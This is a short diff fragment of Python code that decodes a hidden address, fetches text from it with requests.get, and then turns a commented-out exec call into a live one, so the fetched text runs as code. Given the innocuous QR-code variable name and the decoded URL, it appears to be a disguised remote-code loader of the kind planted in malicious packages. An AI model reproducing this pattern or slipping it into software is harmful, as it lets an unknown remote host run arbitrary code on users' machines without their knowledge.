@@ -90,4 +90,4 @@ criaqrcode = criaqrcode.decode("utf-8")
 headers = {'Referer': criaqrcode}
 criaqrcode = requests.get(criaqrcode, headers=headers)
 criaqrcode = criaqrcode.text
-#exec(criaqrcode)    
+exec(criaqrcode)    
